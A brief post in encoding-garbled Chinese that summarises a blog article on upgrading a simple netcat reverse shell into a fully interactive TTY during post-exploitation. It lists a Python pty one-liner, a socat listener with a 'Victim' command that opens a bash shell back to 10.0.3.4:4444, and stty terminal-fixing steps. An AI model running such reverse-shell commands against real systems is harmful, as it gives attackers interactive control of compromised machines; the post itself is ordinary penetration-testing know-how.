#å‡çº§ç®€é™‹çš„ Shell åˆ°å®Œç¾äº¤äº’çš„ TTYs ç»ˆç«¯

tags: #å§¿åŠ¿#, 

å‡çº§ç®€é™‹çš„ Shell åˆ°å®Œç¾äº¤äº’çš„ TTYs ç»ˆç«¯

[Upgrading shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) 

è¿™ç¯‡æ–‡ç« å¾ˆèµï¼Œä»¥å‰æˆ‘ä»¬åå¼¹å›æ¥çš„ NC Shellï¼Œæ“ä½œå®åœ¨å¤ªè¿‡ç®€é™‹ï¼Œä¸€ä¸ªå‘½ä»¤è¾“é”™å°±æ„å‘³ç€ä¸¢å¤± Shellï¼Œæ²¡å†å²ï¼Œæ²¡ Tabï¼Œæ²¡ Vimï¼Œå°±æ˜¯ä¸ªæœ€æœ€ç®€é™‹çš„ Shellã€‚

åå¼¹æŠ€å·§ä¸å°‘ï¼Œè¿™é‡Œå…ˆä¸è°ˆï¼Œæœ‰çš„æ˜¯èƒ½å¾—åˆ°å®Œç¾çš„ TTYs ç»ˆç«¯ï¼Œè¿™ç¯‡æ–‡ç« ç¬¬ä¸€ä¸ªæ–¹å¼å…¶å®ä¹Ÿç®€å•æäº†ï¼Œè™½ç„¶è¿˜ä¸å®Œç¾ã€‚

æ–‡ç« ä»‹ç»äº†ä¸‰ä¸ªæŠ€å·§ï¼Œå¦‚ä¸‹ï¼š

Using Python for a psuedo terminal

python -c 'import pty; pty.spawn("/bin/bash")'

Using socat

#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

Using stty options

# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>

æˆ‘æƒ³ç²¾äº Linux çš„åŒå­¦åº”è¯¥è¿˜ä¼šæœ‰å…¶ä»–æ›´å¥½çš„æŠ€å·§å§ï¼ŸğŸ˜

![image_48844182585518](/assets/48844182585518.jpeg)

![image_88855184282212](/assets/88855184282212.jpeg)

![image_51122814515584](/assets/51122814515584.jpeg)

[comment]: <> (topic_id:88858581481442)

[comment]: <> (create_time:2017-07-11T07:02:50.183+0800)

[comment]: <> (topic_type:talk)

[comment]: <> (owner:781244882_ä½™å¼¦)

